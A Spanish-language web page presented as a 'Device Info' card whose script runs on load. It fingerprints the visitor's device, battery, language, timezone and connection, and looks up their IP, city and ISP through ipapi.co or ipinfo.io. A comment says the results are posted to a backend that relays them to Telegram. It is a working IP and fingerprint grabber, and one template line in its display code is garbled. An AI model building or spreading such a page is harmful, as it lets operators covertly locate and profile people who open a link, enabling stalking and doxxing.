<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>474747 - Device Info</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f0f0f;
      color: #e0e0e0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 16px;
      padding: 28px;
      max-width: 440px;
      width: 100%;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
    }
    .codigo {
      font-size: 0.85rem;
      color: #666;
      letter-spacing: 2px;
      margin-bottom: 4px;
    }
    h1 {
      font-size: 1.5rem;
      margin-bottom: 8px;
      color: #fff;
    }
    .status {
      font-size: 0.95rem;
      color: #aaa;
      margin-bottom: 18px;
    }
    .status.ok { color: #4ade80; }
    .status.error { color: #f87171; }
    .info {
      font-size: 0.88rem;
      color: #bbb;
      line-height: 1.7;
    }
    .info b { color: #ddd; }
  </style>
</head>
<body>
  <div class="card">
    <div class="codigo">474747</div>
    <h1>Device Info</h1>
    <p class="status" id="status">Recolectando información...</p>
    <div class="info" id="info"></div>
  </div>

  <script>
    async function enviarInfo() {
      const statusEl = document.getElementById("status");
      const infoEl = document.getElementById("info");

      const data = {
        // ─── Red ───
        ip: "",
        country: "",
        city: "",
        region: "",
        isp: "",
        conexion: navigator.connection
          ? `${navigator.connection.effectiveType || "?"} / ${navigator.connection.downlink || "?"} Mbps`
          : "No disponible",
        tipoRed: navigator.connection?.type || "Desconocido",
        rtt: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : "N/A",

        // ─── Dispositivo ───
        os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
        browser: (() => {
          const ua = navigator.userAgent;
          if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
          if (ua.includes("Firefox")) return "Firefox";
          if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
          if (ua.includes("Edg")) return "Edge";
          if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
          return "Desconocido";
        })(),
        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocida",
        nucleos: navigator.hardwareConcurrency || "Desconocido",
        pantalla: `${window.screen.width} × ${window.screen.height}`,
        pantallaDisponible: `${window.screen.availWidth} × ${window.screen.availHeight}`,
        pixelRatio: window.devicePixelRatio || 1,
        orientacion: screen.orientation?.type || "Desconocida",
        colorDepth: `${screen.colorDepth} bits`,

        // ─── Batería ───
        bateria: "No disponible",
        cargando: "No disponible",
        nivelBateria: null,

        // ─── Idioma y zona ───
        idioma: navigator.language || "Desconocido",
        idiomas: navigator.languages ? navigator.languages.join(", ") : "N/A",
        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),

        // ─── Otras ───
        toque: "ontouchstart" in window ? "Sí" : "No",
        cookies: navigator.cookieEnabled ? "Sí" : "No",
        doNotTrack: navigator.doNotTrack || "No configurado",
        online: navigator.onLine ? "Sí" : "No",
        userAgent: navigator.userAgent,
        vendor: navigator.vendor || "N/A",
        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0,
        pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
        webdriver: navigator.webdriver ? "Sí (posible bot)" : "No"
      };

      // Batería
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          data.nivelBateria = Math.round(bat.level * 100);
          data.bateria = `${data.nivelBateria}%`;
          data.cargando = bat.charging ? "Cargando ⚡" : "Descargando 🔋";
        } catch (e) {}
      }

      // IP y geolocalización aproximada
      try {
        const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
        data.ip = geo.ip || "";
        data.country = geo.country_name || "";
        data.city = geo.city || "";
        data.region = geo.region || "";
        data.isp = geo.org || "";
      } catch (e) {
        try {
          // Fallback
          const geo2 = await fetch("https://ipinfo.io/json").then(r => r.json());
          data.ip = geo2.ip || "";
          data.country = geo2.country || "";
          data.city = geo2.city || "";
          data.isp = geo2.org || "";
        } catch (e2) {}
      }

      // Mostrar en pantalla
      infoEl.innerHTML = `
        <b>IP:</b> ${data.ip || "—"}<br>
        <b>País:</b> ${data.country || "—"} ${data.city ? "· " + data.city : ""}<br>
        <b>ISP:</b> ${data.isp || "—"}<br>
        <b>Conexión:</b> ${data.conexion}<br>
        <b>OS:</b> ${data.os}<br>
        <b>Navegador:</b> ${data.browser}<br>
        <b>Dispositivo:</b> ${data.device}<br>
        <b>Pantalla:</b> \( {data.pantalla} ( \){data.pixelRatio}x)<br>
        <b>RAM:</b> ${data.ram} · <b>Núcleos:</b> ${data.nucleos}<br>
        <b>Batería:</b> ${data.bateria} · ${data.cargando}<br>
        <b>Idioma:</b> ${data.idioma}<br>
        <b>Zona:</b> ${data.zonaHoraria}
      `;

      // Enviar a Netlify → Telegram
      try {
        const res = await fetch("/api/device", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        const result = await res.json();

        if (result.success) {
          statusEl.textContent = "Información enviada correctamente";
          statusEl.className = "status ok";
        } else {
          statusEl.textContent = "Error al enviar";
          statusEl.className = "status error";
        }
      } catch (err) {
        statusEl.textContent = "Error de conexión";
        statusEl.className = "status error";
        console.error(err);
      }
    }

    enviarInfo();
  </script>
</body>
</html>
